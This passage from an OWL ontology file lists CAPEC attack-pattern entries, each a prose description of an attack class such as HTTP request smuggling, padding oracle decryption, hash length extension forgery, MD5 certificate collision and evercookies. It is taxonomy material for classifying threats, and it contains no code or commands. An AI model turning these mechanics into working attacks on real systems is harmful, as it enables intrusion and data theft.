        rdfs:comment "An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-274

    Annotations: 
        rdfs:comment "An attacker modifies the HTTP Verb (e.g. GET, PUT, TRACE, etc.) in order to bypass access restrictions. Some web environments allow administrators to restrict access based on the HTTP Verb used with requests. However, attackers can often provide a different HTTP Verb, or even provide a random string as a verb in order to bypass these protections. This allows the attacker to access data that should otherwise be protected."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-276

    Annotations: 
        rdfs:comment "Inter-component protocols are used to communicate between different software and hardware modules within a single computer. Common examples are: interrupt signals and data pipes. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-277

    Annotations: 
        rdfs:comment "Data Interchange Protocols are used to transmit structured data between entities. These protocols are often specific to a particular domain (B2B: purchase orders, invoices, transport logistics and waybills, medical records). They are often, but not always, XML-based. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-278

    Annotations: 
        rdfs:comment "An adversary manipulates a web service related protocol to cause a web application or service to react differently than intended. This can either be performed through the manipulation of call parameters to include unexpected values, or by changing the called function to one that should normally be restricted or limited. By leveraging this pattern of attack, the adversary is able to gain access to data or resources normally restricted, or to cause the application or service to crash."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-279

    Annotations: 
        rdfs:comment "Simple Object Access Protocol (SOAP) is used as a communication protocol between a client and server to invoke web services on the server. It is an XML-based protocol, and therefore suffers from many of the same shortcomings as other XML-based protocols. Adviseries can make use these shortcomings to mount an denial of service attack, disclose information and execute arbitrary code. This includes a SOAP parameter tampering attack in which an attacker sends a SOAP message where the field values are other than what the server is likely to expect in order to precipitate non-standard server behavior."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-28

    Annotations: 
        rdfs:comment "In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve his goals."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-29

    Annotations: 
        rdfs:comment "This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. A typical example is file access. The adversary can leverage a file access race condition by \"running the race\", meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary could replace or modify the file, causing the application to behave unexpectedly."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-3

    Annotations: 
        rdfs:comment "Some APIs will strip certain leading characters from a string of parameters. An adversary can intentionally introduce leading \"ghost\" characters (extra characters that don't affect the validity of the request at the API layer) that enable the input to pass the filters and therefore process the adversary's input. This occurs when the targeted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targeted API."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-30

    Annotations: 
        rdfs:comment "Adversaries can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. This can allow the adversary to access functionality the system's designer didn't intend for them to, but they may also go undetected or deny other users essential services in a catastrophic (or insidiously subtle) way."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-31

    Annotations: 
        rdfs:comment "This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-33

    Annotations: 
        rdfs:comment "HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-34

    Annotations: 
        rdfs:comment "This attack uses a maliciously-crafted HTTP request in order to cause a vulnerable web server to respond with an HTTP response stream that will be interpreted by the client as two separate responses instead of one. This is possible when user-controlled input is used unvalidated as part of the response headers. The target software, the client, will interpret the injected header as being a response to a second request, thereby causing the maliciously-crafted contents be displayed and possibly cached."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-35

    Annotations: 
        rdfs:comment "An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-36

    Annotations: 
        rdfs:comment "An adversary searches for and invokes APIs that the target system designers did not intend to be publicly available. If these APIs fail to authenticate requests the attacker may be able to invoke functionality they are not authorized for."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-37

    Annotations: 
        rdfs:comment "An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-38

    Annotations: 
        rdfs:comment "This pattern of attack sees an adversary load a malicious resource into a program's standard path so that when a known command is executed then the system instead executes the malicious component. The adversary can either modify the search path a program uses, like a PATH variable or classpath, or they can manipulate resources on the path to point to their malicious components. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-383

    Annotations: 
        rdfs:comment "An adversary hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the adversary creating an event within the sub-application. Assume the adversary hosts a \"virtual sale\" of rare items. As other users enter the event, the attacker records via MITM proxy the user_ids and usernames of everyone who attends. The adversary would then be able to spam those users within the application using an automated script."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-384

    Annotations: 
        rdfs:comment "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system. Despite the use of MITM software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true \"Man-in-the-Middle\" attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-385

    Annotations: 
        rdfs:comment "An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-386

    Annotations: 
        rdfs:comment "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-387

    Annotations: 
        rdfs:comment "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the destination of various application interface elements."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-388

    Annotations: 
        rdfs:comment "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-389

    Annotations: 
        rdfs:comment "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-39

    Annotations: 
        rdfs:comment "In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-4

    Annotations: 
        rdfs:comment "This attack relies on the attacker using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names (FQDNs), URL, IP address, or IP Address ranges. If the location information is not validated against a variety of different possible encodings and formats, the adversary can use an alternate format to bypass application access control."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-40

    Annotations: 
        rdfs:comment "This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-41

    Annotations: 
        rdfs:comment "This type of attack involves an attacker leveraging meta-characters in email headers to inject improper behavior into email programs. Email software has become increasingly sophisticated and feature-rich. In addition, email applications are ubiquitous and connected directly to the Web making them ideal targets to launch and propagate attacks. As the user demand for new functionality in email applications grows, they become more like browsers with complex rendering and plug in routines. As more email functionality is included and abstracted from the user, this creates opportunities for attackers. Virtually all email applications do not list email header information by default, however the email header contains valuable attacker vectors for the attacker to exploit particularly if the behavior of the email client application is known. Meta-characters are hidden from the user, but can contain scripts, enumerations, probes, and other attacks against the user's system."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-42

    Annotations: 
        rdfs:comment "An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-43

    Annotations: 
        rdfs:comment "An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a \"layer\" of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps. The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application: <parser1> --> <input validator> --> <parser2>. In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-441

    Annotations: 
        rdfs:comment "An adversary installs or adds malicious logic (also known as malware) into a seemingly benign component of a fielded system. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. With the proliferation of mass digital storage and inexpensive multimedia devices, Bluetooth and 802.11 support, new attack vectors for spreading malware are emerging for things we once thought of as innocuous greeting cards, picture frames, or digital projectors. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems and their components that are still under development and part of the supply chain."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-45

    Annotations: 
        rdfs:comment "This type of attack leverages the use of symbolic links to cause buffer overflows. An attacker can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-459

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in the MD5 hash algorithm (weak collision resistance) to generate a certificate signing request (CSR) that contains collision blocks in the \"to be signed\" part. The adversary specially crafts two different, but valid X.509 certificates that when hashed with the MD5 algorithm would yield the same value. The adversary then sends the CSR for one of the certificates to the Certification Authority which uses the MD5 hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the adversary which is signed with its private key. An adversary then takes that signed blob and inserts it into another X.509 certificate that the attacker generated. Due to the MD5 collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate.

The net effect is that the adversary's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority. To make the attack more interesting, the second certificate could be not just a regular certificate, but rather itself a signing certificate. Thus the adversary is able to start their own Certification Authority that is anchored in its root of trust in the legitimate Certification Authority that has signed the attackers' first X.509 certificate. If the original Certificate Authority was accepted by default by browsers, so will now the Certificate Authority set up by the adversary and of course any certificates that it signs. So the adversary is now able to generate any SSL certificates to impersonate any web server, and the user's browser will not issue any warning to the victim. This can be used to compromise HTTPS communications and other types of systems where PKI and X.509 certificates may be used (e.g., VPN, IPSec) ."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-46

    Annotations: 
        rdfs:comment "This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The attacker crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-460

    Annotations: 
        rdfs:comment "An attacker overrides or adds HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-461

    Annotations: 
        rdfs:comment "When web services require callees to authenticate, they sometimes issue a token / secret to the caller that the caller is to use to sign their web service calls. In one such scheme the caller when constructing a request would concatenate all of the parameters passed to the web service with the provided authentication token and then generate a hash of the concatenated string (e.g., MD5, SHA1, etc.). That hash then forms the signature that is passed to the web service which is used on the server side to verify the origin authenticity and integrity of the message. There is a practical attack against an authentication scheme of this nature that makes use of the hash function extension / padding weakness. Leveraging this weakness, an attacker, who does not know the secret token, is able to modify the parameters passed to the web service by generating their own call and still generate a legitimate signature hash. For instance, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) II M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error. Because of the iterative design of the hash function, it is possible, from only the hash of a message and its length, to compute the hash of longer messages that start with the initial message and include the padding required for the initial message to reach a multiple of 512 bits. It is important to note that the attack not limited to MD5 and will work just as well with another hash function like SHA1."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-462

    Annotations: 
        rdfs:comment "An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's same origin policy prevents the attacker from directly reading the server responses (in the absence of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain. For GET requests an attacker could for instance leverage the \"img\" tag in conjunction with \"onload() / onerror()\" javascript events. For the POST requests, an attacker could leverage the \"iframe\" element and leverage the \"onload()\" event. There is nothing in the current browser security model that prevents an attacker to use these methods to time responses to the attackers' cross domain requests. The timing for these responses leaks information. For instance, if a victim has an active session with their online e-mail account, an attacker could issue search requests in the victim's mailbox. While the attacker is not able to view the responses, based on the timings of the responses, the attacker could ask yes / no questions as to the content of victim's e-mails, who the victim e-mailed, when, etc. This is but one example; There are other scenarios where an attacker could infer potentially sensitive information from cross domain requests by timing the responses while asking the right questions that leak information."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-463

    Annotations: 
        rdfs:comment "An adversary is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an adversary is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an adversary is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key. Any cryptosystem can be vulnerable to padding oracle attacks if the encrypted messages are not authenticated to ensure their validity prior to decryption, and then the information about padding error is leaked to the adversary. This attack technique may be used, for instance, to break CAPTCHA systems or decrypt/modify state information stored in client side objects (e.g., hidden fields or cookies). This attack technique is a side-channel attack on the cryptosystem that uses a data leak from an improperly implemented decryption routine to completely subvert the cryptosystem. The one bit of information that tells the adversary whether a padding error during decryption has occurred, in whatever form it comes, is sufficient for the adversary to break the cryptosystem. That bit of information can come in a form of an explicit error message about a padding error, a returned blank page, or even the server taking longer to respond (a timing attack). This attack can be launched cross domain where an adversary is able to use cross-domain information leaks to get the bits of information from the padding oracle from a target system / service with which the victim is communicating. To do so an adversary sends a request containing ciphertext to the target system. Due to the browser's same origin policy, the adversary is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). For instance, this can be done using \"img\" tag plus the onerror()/onload() events. The adversary's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-464

    Annotations: 
        rdfs:comment "An attacker creates a very persistent cookie that stays present even after the user thinks it has been removed. The cookie is stored on the victim's machine in over ten places to include: Standard HTTP Cookies, Local Shared Objects (Flash Cookies), Silverlight Isolated Storage, Storing cookies in RGB values of auto-generated, force-cached, PNGs using HTML5 Canvas tag to read pixels (cookies) back out, Storing cookies in Web History, Storing cookies in HTTP ETags, Storing cookies in Web cache, window.name caching, Internet Explorer userData storage, HTML5 Session Storage, HTML5 Local Storage, HTML5 Global Storage, HTML5 Database Storage via SQLite, among others. When the victim clears the cookie cache via traditional means inside the browser, that operation removes the cookie from certain places but not others. The malicious code then replicates the cookie from all of the places where it was not deleted to all of the possible storage locations once again. So the victim again has the cookie in all of the original storage locations. In other words, failure to delete the cookie in even one location will result in the cookie's resurrection everywhere. The evercookie will also persist across different browsers because certain stores (e.g., Local Shared Objects) are shared between different browsers."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-465

    Annotations: 
        rdfs:comment "A transparent proxy serves as an intermediate between the client and the internet at large. It intercepts all requests originating from the client and forwards them to the correct location. The proxy also intercepts all responses to the client and forwards these to the client. All of this is done in a manner transparent to the client. Transparent proxies are often used by enterprises and ISPs. For requests originating at the client transparent proxies need to figure out the final destination of the client's data packet. Two ways are available to do that: either by looking at the layer three (network) IP address or by examining layer seven (application) HTTP header destination. A browser has same origin policy that typically prevents scripts coming from one domain initiating requests to other websites from which they did not come. To circumvent that, however, malicious Flash or an Applet that is executing in the user's browser can attempt to create a cross-domain socket connection from the client to the remote domain. The transparent proxy will examine the HTTP header of the request and direct it to the remote site thereby partially bypassing the browser's same origin policy. This can happen if the transparent proxy uses the HTTP host header information for addressing rather than the IP address information at the network layer. This attack allows malicious scripts inside the victim's browser to issue cross-domain requests to any hosts accessible to the transparent proxy."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-466

    Annotations: 
        rdfs:comment "An attacker leverages a man in the middle attack in order to bypass the same origin policy protection in the victim's browser. This active man in the middle attack could be launched, for instance, when the victim is connected to a public WIFI hot spot. An attacker is able to intercept requests and responses between the victim's browser and some non-sensitive website that does not use TLS. For instance, the victim may be checking flight or weather information. When an attacker intercepts a response bound to the victim, an attacker adds an iFrame (which is possibly invisible) to the response referencing some domain with sensitive functionality and forwards the response to the victim. The victim's browser than automatically initiates an unauthorized request to the site with sensitive functionality. The same origin policy would prevent making these requests to a site other than the one from which the Java Script came, but the attacker once again uses active man in the middle to intercept these automatic requests and redirect them to the domain / service with sensitive functionality. Any persistent cookies that the victim has in his or her browser would be used for these unauthorized requests. The attacker thus actively directs the victim to a site with sensitive functionality. When the site with sensitive functionality responds back to the victim's request, an active man in the middle attacker intercepts these responses, injects his or her own malicious Java Script into these responses, and forwards to the victim's browser. In the victim's browser, that Java Script executes under the restrictions of the site with sensitive functionality and can essentially be used to continue to interact with the sensitive site. So an attacker can execute scripts within the victim's browser on any domains the attacker desires. The attacker is able to use this technique to steal cookies from the victim's browser for whatever site the attacker wants. This applies to both persistent cookies and HTTP only cookies (unlike traditional XSS attacks). An attacker is also able to use this technique to steal authentication credentials for sites that only encrypt the login form, but do not require a secure channel for the initial request to get to the page with the login form. Further the attacker is also able to steal any autocompletion information. This attack pattern can also be used to enable session fixation and cache poisoning attacks. Additional attacks can be enabled as well."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-467

    Annotations: 
        rdfs:comment "An attacker harvests identifying information about a victim via an active session that the victim's browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the \"remember me\" feature to keep his or her session with the social networking site active. An attacker induces a payload to execute in the victim's browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing). In one example of an attack, an attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in his or her browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site. There are many other ways in which the attacker may get the payload to execute in the victim's browser mainly by finding a way to hide it in some reputable site that the victim visits. The attacker could also send the link to the victim in an e-mail and trick the victim into clicking on the link. This attack is basically a cross site request forgery attack with two main differences. First, there is no action that is performed on behalf of the user aside from harvesting information. So standard CSRF protection may not work in this situation. Second, what is important in this attack pattern is the nature of the data being harvested, which is identifying information that can be obtained and used in context. This real time harvesting of identifying information can be used as a prelude for launching real time targeted social engineering attacks on the victim."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-468

    Annotations: 
        rdfs:comment "An attacker makes use of Cascading Style Sheets (CSS) injection to steal data cross domain from the victim's browser. The attack works by abusing the standards relating to loading of CSS: 1. Send cookies on any load of CSS (including cross-domain) 2. When parsing returned CSS ignore all data that does not make sense before a valid CSS descriptor is found by the CSS parser By having control of some text in the victim's domain, the attacker is able to inject a seemingly valid CSS string. It does not matter if this CSS string is preceded by other data. The CSS parser will still locate the CSS string. If the attacker is able to control two injection points, one before the cross domain data that the attacker is interested in receiving and the other one after, the attacker can use this attack to steal all of the data in between these two CSS injection points when referencing the injected CSS while performing rendering on the site that the attacker controls. When rendering, the CSS parser will detect the valid CSS string to parse and ignore the data that \"does not make sense\". That data will simply be rendered. That data is in fact the data that the attacker just stole cross domain. The stolen data may contain sensitive information, such CSRF protection tokens."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-469

    Annotations: 
        rdfs:comment "An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-47

    Annotations: 
        rdfs:comment "In this attack, the target software is given input that the attacker knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-470

    Annotations: 
        rdfs:comment "An attacker is able to leverage access gained to the database to read / write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine. Traditionally SQL injections attacks are viewed as a way to gain unauthorized read access to the data stored in the database, modify the data in the database, delete the data, etc. However, almost every data base management system (DBMS) system includes facilities that if compromised allow an attacker complete access to the file system, operating system, and full access to the host running the database. The attacker can then use this privileged access to launch subsequent attacks. These facilities include dropping into a command shell, creating user defined functions that can call system level libraries present on the host machine, stored procedures, etc."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-473

    Annotations: 
        rdfs:comment "An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-474

    Annotations: 
        rdfs:comment "Signature Spoofing by Key Theft"^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-477

    Annotations: 
        rdfs:comment "An attacker exploits the underlying complexity of a data structure that allows for both signed and unsigned content, to cause unsigned data to be processed as though it were signed data."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-478

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in access control to modify the execution parameters of a Windows service. Specifically, if the permissions for users and groups are not properly assigned and allow access to the registry keys used to store the configuration information for a service, then an adversary could change settings defining the path to the executable and cause a malicious binary to be executed."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-479

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in authorization and installs a new root certificate on a compromised system. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-484

    Annotations: 
        rdfs:comment "Client applications such as web browsers that process HTML data often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. These adverse effects may include the parser crashing, consuming too much of a resource, executing too slowly, executing code supplied by an attacker, allowing usage of unintended system functionality, etc. An attacker's goal is to leverage parser failure to his or her advantage. In some cases it may be possible to jump from the data plane to the control plane via bad data being passed to an XML parser. [R.484.1]"^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-485

    Annotations: 
        rdfs:comment "An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-49

    Annotations: 
        rdfs:comment "In this attack, the adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.

A system will be particularly vulnerable to this type of an attack if it does not have a proper enforcement mechanism in place to ensure that passwords selected by users are strong passwords that comply with an adequate password policy.

In practice a pure brute force attack on passwords is rarely used, unless the password is suspected to be weak. Other password cracking methods exist that are far more effective (e.g. dictionary attacks, rainbow tables, etc.)."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-50

    Annotations: 
